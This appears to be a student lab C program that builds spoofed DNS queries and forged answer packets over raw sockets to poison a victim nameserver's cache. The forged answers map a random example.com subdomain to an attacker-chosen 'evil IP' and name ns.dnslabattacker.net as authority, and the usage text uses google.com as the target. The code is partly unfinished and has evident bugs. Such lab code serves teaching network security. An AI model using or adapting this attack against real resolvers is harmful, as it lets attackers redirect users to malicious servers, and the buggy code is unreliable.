// ----udp.c------
// This sample program must be run by root lol! 
// 
// The program is to spoofing tons of different queries to the victim.
// Use wireshark to study the packets. However, it is not enough for 
// the lab, please finish the response packet and complete the task.
//
// Compile command:
// gcc -lpcap udp.c -o udp
//
// 
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <libnet.h>
#include <arpa/inet.h>
#include <time.h>

#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100
     


// Can create separate header file (.h) for all headers' structure

// The IP header's structure

struct ipheader {
    unsigned char      iph_ihl:4, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    //    unsigned char      iph_flag;
    unsigned short int iph_offset;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;
};

// UDP header's structure
struct udpheader {
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;
};

struct dnsheader {
	unsigned short int query_id;
	unsigned short int flags;
	unsigned short int QDCOUNT;
	unsigned short int ANCOUNT;
	unsigned short int NSCOUNT;
	unsigned short int ARCOUNT;
};

// This structure just for convinience in the DNS packet, because such 4 byte data often appears. 
struct dataEnd {
	unsigned short int  type;
	unsigned short int  class;
};
// total udp header length: 8 bytes (=64 bits)
#pragma pack ( 1 )
struct RES_RECORD {
    unsigned char *name;
    struct dataEnd dataend;
    uint32_t ttl;
    unsigned short rdlength;
    unsigned char *rdata;
};

unsigned int checksum(uint16_t *usBuff, int isize)
{
	unsigned int cksum=0;
	for(;isize>1;isize-=2){
	    cksum+=*usBuff++;
    }
	if(isize==1) {
        cksum+=*(uint16_t *)usBuff;
    }


	return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
    unsigned long sum=0;
	struct ipheader *tempI=(struct ipheader *)(buffer);
	struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));
	struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));
	tempH->udph_chksum=0;
	sum=checksum( (uint16_t *)   &(tempI->iph_sourceip) ,8 );
	sum+=checksum((uint16_t *) tempH,len);

	sum+=ntohs(IPPROTO_UDP+len);
	

	sum=(sum>>16)+(sum & 0x0000ffff);
	sum+=(sum>>16);

	return (uint16_t)(~sum);
	
}

unsigned short csum(unsigned short *buf, int nwords) 
{
    unsigned long sum;

    for(sum=0; nwords>0; nwords--)

            sum += *buf++;

    sum = (sum >> 16) + (sum &0xffff);

    sum += (sum >> 16);

    return (unsigned short)(~sum);

}




















unsigned int write_question(void *buffer, char *query) {
    strcpy(buffer, query);
    int query_len = strlen(query)+1;

    buffer = buffer + query_len; //Write next bytes

    struct dataEnd * end=(struct dataEnd *)(buffer);
    end->type=htons(1);
    end->class=htons(1);

    unsigned int bytes_written = query_len + sizeof( struct dataEnd );
    return bytes_written;
}

//By given query, write A type DNS answer with given ip_answer
unsigned int write_answer(void *buffer, char *query,char *ip_answer) {
    unsigned int bytes_written = 0;

    strcpy(buffer, query);
    int query_len = strlen(query)+1;

    buffer = buffer + query_len;
    bytes_written += query_len; //query

    struct RES_RECORD *answer=(struct RES_RECORD*)(buffer - sizeof(void*)); //minus sizeof(char *name)
    answer->dataend.type = htons(1);
    answer->dataend.class = htons(1);
    answer->ttl = htonl(82400);
    answer->rdlength = htons(4);
    answer->rdata = inet_addr(ip_answer);

    
    bytes_written += sizeof(unsigned short) * 3; //type + class + rdlength
    bytes_written += sizeof(uint32_t); //ttl
    bytes_written += 4; //size of rdata (4 octets)

    return bytes_written;
}










unsigned int write_authorative_answer(void *buffer, char *query_domain, char *name_server) {
    unsigned int bytes_written = 0;

    //Name
    strcpy(buffer, query_domain);
    int q_len = strlen(query_domain) + 1;
    
    buffer += q_len;
    bytes_written += q_len; //name


    struct RES_RECORD *authorative=(struct RES_RECORD*)(buffer - sizeof(void*)); //minus sizeof(char *name)

    //Type
    authorative->dataend.type = htons(2); //ns
    
    //Class
    authorative->dataend.class = htons(1); //inet

    //TTL
    authorative->ttl = htonl(82400);

    //Rd (name server) length
    int ns_len = strlen(name_server) + 1;
    authorative->rdlength = htons(ns_len);
    
    unsigned int sum_bytes = 3 * sizeof(unsigned short) + sizeof(uint32_t); //type, class, tll, rdlength
    bytes_written += sum_bytes;
    buffer += sum_bytes;

    //Rdata (Name Server)
    strcpy(buffer, name_server);
    bytes_written += ns_len; //nameserver

    return bytes_written;
    
}












//Returns amount of bytes of packet written to dst_buffer
unsigned int generate_dns_question (
    char *src_ip, 
    char *dst_ip, 
    char *query, 
    char *dst_buffer) 
{

    char *buffer = dst_buffer;
    // Our own headers' structures
    struct ipheader *ip = (struct ipheader *) buffer;
    ip->iph_ident = htons(rand()); // we give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP
    ip->iph_sourceip = inet_addr(src_ip);
    ip->iph_destip = inet_addr(dst_ip);
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay

    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
    udp->udph_srcport = htons(3333);
    udp->udph_destport = htons(53);

    struct dnsheader *dns = (struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));

    // data is the pointer points to the first byte of the dns payload  
    unsigned char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

    //standart response
	dns->flags=htons(FLAG_R);
    //Random transaction ID
    dns->query_id=rand();

    //Points to the last byte written
    void *last_byte = data;

    int query_len = strlen(query)+1;

    
    //Query section
    unsigned int bytes_written_question = write_question(last_byte, query);
    last_byte += bytes_written_question;
    dns->QDCOUNT=htons(1); //Query count
    
    unsigned short int packetquery_len =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+ bytes_written_question );
    ip->iph_len=htons(packetquery_len);
    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+bytes_written_question);

    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum=check_udp_sum(buffer, packetquery_len-sizeof(struct ipheader));

    return packetquery_len;
}












//Returns amount of bytes of packet written to dst_buffer
unsigned int generate_dns_answer (
    char *src_ip, 
    char *dst_ip, 
    char *query, 
    char *ip_answer, 
    char *dst_buffer,
    unsigned short **txid_ptr) 
{

    char *buffer = dst_buffer;
    // Our own headers' structures
    struct ipheader *ip = (struct ipheader *) buffer;
    ip->iph_ident = htons(rand()); // we give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP
    ip->iph_sourceip = inet_addr(src_ip);
    ip->iph_destip = inet_addr(dst_ip);
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay

    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
    udp->udph_srcport = htons(40000+rand()%10000);  // source port number, I make them random... remember the lower number may be reserved
    udp->udph_destport = htons(53);

    struct dnsheader *dns = (struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));

    // data is the pointer points to the first byte of the dns payload  
    unsigned char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

    //standart response
	dns->flags=htons(FLAG_R);
    //Random transaction ID
    dns->query_id=rand();
    
    *txid_ptr = &(dns->query_id);

    //Points to the last byte written
    void *last_byte = data;

    int query_len = strlen(query)+1;

    
    //Query section
    unsigned int bytes_written_question = write_question(last_byte, query);
    last_byte += bytes_written_question;
    dns->QDCOUNT=htons(1); //Query count

    //Answer section
    unsigned int bytes_written_answer = write_answer(last_byte, query, ip_answer);
    last_byte += bytes_written_answer; 
    dns->ANCOUNT=htons(1); //Answer count

    //Authorative section
    char *name_server = "\2ns\16dnslabattacker\3net";
    
    

    unsigned int bytes_written_authorative_answer = write_authorative_answer(last_byte, query,name_server);
    last_byte += bytes_written_authorative_answer;
    dns->NSCOUNT=htons(1); //Name Server count
    

    unsigned int bytes_written_sum =  bytes_written_question + bytes_written_answer + bytes_written_authorative_answer;
    unsigned short int packetquery_len =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+ bytes_written_sum );
    ip->iph_len=htons(packetquery_len);
    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+bytes_written_sum);

    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum=check_udp_sum(buffer, packetquery_len-sizeof(struct ipheader));

    return packetquery_len;
}







int main(int argc, char *argv[])
{
    // socket descriptor
    int sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    if(sd<0 ) // if socket fails to be created 
        printf("socket error\n");

    if(argc != 6) {
        printf("Usage: \
            \n\tSRC IP (your computer), \
            \n\tDST IP (victim nameserver) , \
            \n\tTARGET DOMAIN'S NAMESERVER (example: ns1.BankOfShlomi.com) \
            \n\tTARGET DOMAIN'S NAMESERVER IP (IP of ns1.BankOfShlomi.com \
            \n\tEVIL IP (the victim will store this IP, it should be evil) \
            \nExample: \
            \n\tsudo ./a.out 127.0.0.1 127.0.0.1 google.com ns1.google.com 216.239.32.10 6.6.6.6 \
            \n");
        //You can use DIG tool (dig NS google.com) to find name servers
        exit(-1);
    }

    // Inform the kernel do not fill up the packet structure. we will build our own...
    int one = 1;
    const int *val = &one;
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 ) {
        printf("error\n");	
        exit(-1);
    }

    char *src_ip = argv[1];
    char *dst_ip = argv[2];
    char *target_domain_nameserver = argv[3];
    char *target_domain_nameserver_ip = argv[4];
    char *evil_ip = argv[5];

    struct sockaddr_in sin, din;

    // The source is redundant, may be used later if needed
    // The address family
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    // Port numbers
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);
    // IP addresses
    sin.sin_addr.s_addr = inet_addr(src_ip); // this is the second argument we input into the program
    din.sin_addr.s_addr = inet_addr(dst_ip); // this is the first argument we input into the program

    // buffer to hold the packet
    char buffer[PCKT_LEN];
    // set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);

    //Packet length in bytes
    unsigned int packet_len = 0;

    //Pointer to the DNS TXID field (to change it later)
    unsigned short *txid_ptr; //points to buffer

    char query[18];
    strcpy(query, "\4????\7example\3com");

    srand(time(0)); //use time as seed

    //randomize query (first 4 chars of first label)
    for(int i = 1; i < 5; i++) {
        query[i] = '1' + rand() % ('9'-'1');
    }

    packet_len = generate_dns_question(src_ip, dst_ip, query, buffer);

    printf("Sending query...\n");    
    //Ask random query
    if(sendto(sd, buffer, packet_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        printf("packet send error %d which means %s\n",errno,strerror(errno));
    }
    
    //Flood with fake answers
    
    memset(buffer, 0, PCKT_LEN);

    //We spoof src ip. 
    packet_len = generate_dns_answer(target_domain_nameserver_ip, dst_ip, query, evil_ip, buffer, &txid_ptr);

    printf("Sending flood answer packets...\n");
    for(int i = 0; i < 2; i++) {
        if(sendto(sd, buffer, packet_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            printf("packet send error %d which means %s\n",errno,strerror(errno));
        }
        printf("Sent!\n");
        *txid_ptr = -1;
    }
    

    close(sd);
    return 0;
}

